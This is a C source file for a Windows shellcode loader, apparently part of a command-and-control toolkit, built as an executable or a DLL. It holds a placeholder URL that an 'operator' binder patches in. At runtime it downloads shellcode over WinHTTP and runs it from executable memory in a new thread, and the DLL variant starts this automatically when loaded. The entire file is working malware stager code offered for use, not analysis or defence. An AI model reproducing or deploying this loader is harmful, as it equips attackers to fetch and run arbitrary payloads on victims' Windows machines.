/*
 * Native shellcode loader for Windows (exe + dll variants).
 *
 * Mirrors nostdlib/android-loader's loader.c: a 256-byte g_url buffer seeded
 * with the ASCII marker "SHELLCODE_URL_PLACEHOLDER" is patched at C2 bind time
 * with the operator's shellcode URL. At runtime the loader downloads the
 * position-independent agent over WinHTTP (TLS 1.2, redirects followed) and
 * runs it in-process via VirtualAlloc + CreateThread.
 *
 * Build (CMake drives this for x64/x86, exe/dll):
 *   exe:  cl /MT /DBUILD_EXE  loader.c  /link /SUBSYSTEM:WINDOWS winhttp.lib
 *   dll:  cl /MT /DBUILD_DLL /LD loader.c /link winhttp.lib
 */

#include <windows.h>
#include <winhttp.h>
#include <string.h>
#include <stdlib.h>

#pragma comment(lib, "winhttp.lib")

/* ── URL placeholder — patched by the C2 binder (same contract as android-loader) ──
 * The remainder of a partially-initialized array is zero-filled by C, so this is
 * a 256-byte buffer: the 25-byte marker at offset 0 followed by 231 NUL bytes.
 * The binder locates the marker, zeroes the whole 256-byte slot, writes the URL. */
static char g_url[256] = "SHELLCODE_URL_PLACEHOLDER";

/* ── WinHTTP download (TLS 1.2, auto-follows redirects — handles GitHub → S3 302) ── */

static unsigned char *http_download(const char *url, size_t *out_len)
{
    wchar_t wurl[1024] = {0};
    if (MultiByteToWideChar(CP_UTF8, 0, url, -1, wurl, 1024) == 0) return NULL;

    URL_COMPONENTSW uc = {0};
    uc.dwStructSize = sizeof(uc);
    wchar_t host[256] = {0}, path[2048] = {0};
    uc.lpszHostName = host;     uc.dwHostNameLength = 256;
    uc.lpszUrlPath  = path;     uc.dwUrlPathLength  = 2048;
    if (!WinHttpCrackUrl(wurl, 0, 0, &uc)) return NULL;

    BOOL secure = (uc.nScheme == INTERNET_SCHEME_HTTPS);
    INTERNET_PORT port = uc.nPort ? uc.nPort : (secure ? INTERNET_DEFAULT_HTTPS_PORT
                                                       : INTERNET_DEFAULT_HTTP_PORT);

    HINTERNET hSession = WinHttpOpen(L"c2-loader/1.0",
                                     WINHTTP_ACCESS_TYPE_AUTOMATIC_PROXY,
                                     WINHTTP_NO_PROXY_NAME, WINHTTP_NO_PROXY_BYPASS, 0);
    if (!hSession) return NULL;

    /* GitHub requires TLS 1.2+. */
    DWORD tls = WINHTTP_FLAG_SECURE_PROTOCOL_TLS1_2;
    WinHttpSetOption(hSession, WINHTTP_OPTION_SECURE_PROTOCOLS, &tls, sizeof(tls));

    HINTERNET hConnect = WinHttpConnect(hSession, host, port, 0);
    if (!hConnect) { WinHttpCloseHandle(hSession); return NULL; }

    HINTERNET hRequest = WinHttpOpenRequest(hConnect, L"GET",
                                            uc.lpszUrlPath, NULL, WINHTTP_NO_REFERER,
                                            WINHTTP_DEFAULT_ACCEPT_TYPES,
                                            secure ? WINHTTP_FLAG_SECURE : 0);
    if (!hRequest) { WinHttpCloseHandle(hConnect); WinHttpCloseHandle(hSession); return NULL; }

    BOOL ok = WinHttpSendRequest(hRequest, WINHTTP_NO_ADDITIONAL_HEADERS, 0,
                                 WINHTTP_NO_REQUEST_DATA, 0, 0, 0)
           && WinHttpReceiveResponse(hRequest, NULL);

    unsigned char *buf = NULL;
    if (ok)
    {
        size_t cap = 256 * 1024, len = 0;
        buf = malloc(cap);
        if (buf)
        {
            DWORD avail = 0, read = 0;
            for (;;)
            {
                if (!WinHttpQueryDataAvailable(hRequest, &avail) || avail == 0) break;
                if (len + avail > cap)
                {
                    while (len + avail > cap) cap *= 2;
                    unsigned char *tmp = realloc(buf, cap);
                    if (!tmp) { free(buf); buf = NULL; break; }
                    buf = tmp;
                }
                if (!WinHttpReadData(hRequest, buf + len, avail, &read) || read == 0) break;
                len += read;
            }
            if (buf && len) { *out_len = len; }
            else { free(buf); buf = NULL; }
        }
    }

    WinHttpCloseHandle(hRequest);
    WinHttpCloseHandle(hConnect);
    WinHttpCloseHandle(hSession);
    return buf;
}

/* ── Shellcode execution (RWX alloc + memcpy + CreateThread) ── */

static int run_shellcode(unsigned char *sc, size_t sc_len)
{
    void *mem = VirtualAlloc(NULL, sc_len, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
    if (!mem) return -1;
    memcpy(mem, sc, sc_len);
    HANDLE h = CreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)mem, NULL, 0, NULL);
    if (h) { WaitForSingleObject(h, INFINITE); CloseHandle(h); }
    return 0;
}

/* ── Loader thread (shared by exe + dll entry points) ── */

static DWORD WINAPI loader_thread(LPVOID arg)
{
    (void)arg;
    size_t sc_len = 0;
    unsigned char *sc = http_download(g_url, &sc_len);
    if (sc && sc_len) run_shellcode(sc, sc_len);
    if (sc) free(sc);
    return 0;
}

/* ── Entry points ── */

#ifdef BUILD_DLL
BOOL APIENTRY DllMain(HMODULE hMod, DWORD reason, LPVOID arg)
{
    (void)arg;
    if (reason == DLL_PROCESS_ATTACH)
    {
        DisableThreadLibraryCalls(hMod);
        /* Never block inside DllMain — kick off the loader on its own thread. */
        HANDLE h = CreateThread(NULL, 0, loader_thread, NULL, 0, NULL);
        if (h) CloseHandle(h);
    }
    return TRUE;
}
#else
int WINAPI wWinMain(HINSTANCE hInst, HINSTANCE hPrev, PWSTR cmd, int show)
{
    (void)hInst; (void)hPrev; (void)cmd; (void)show;
    loader_thread(NULL);
    return 0;
}
#endif
